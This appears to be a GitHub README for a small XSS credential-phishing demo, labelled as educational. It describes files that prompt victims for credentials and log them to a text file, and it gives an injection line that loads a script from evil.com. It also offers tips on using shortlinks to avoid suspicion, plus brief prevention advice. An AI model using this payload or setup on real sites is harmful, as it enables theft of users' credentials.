# xss (Cross Site Social-engineering)

simple implementasion of social engineering from xss
--for education purpose only--

# about this repository
This repository will tell you how bad xss it is

# content in this repository
x.js
simple javascript payload to trigger user to give them credential's and send them to x.php

x.php
simple php script to receive credential's from x.js and write it to creds.txt

creds.txt
file that store credential's from x.php and x.js

# what is xss ?
Cross-site scripting is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy. --Wikipedia--

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. --OWASP--

# how it's work ?
```x.js```, ```x.php```, and ```creds.txt``` stored at evil.com then attacker use xss payload
to your website that vulnerable from xss --> ```<script src=https://evil.com/x.js></script>```

if xss reflected, attacker usually use shortlink to avoid suspicion and make the user of your website click into it
if xss stored, attacker usually just wait for the payload triggered from another user

and this will happen

![popup](https://raw.githubusercontent.com/laztname/xss/master/the.gif)

if the user of your website doesn't aware about security then they just believe it and don't know that was a scam accidentally they send their credential to the evil.com

# is xss just pop-up only ?
NO, attacker can use any javascript payload to use your website that vulnerable from xss
for any variation payload see it here http://www.xss-payloads.com/payloads-list.html?a#category=all

# how prevent from xss ?
make sure filter any input from your website and don't forget to strip any html tags

# more information you can get from here
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

# special thanks to
- Allah
- my laptop
- surabayahackerlink.org
- xss-payloads.com
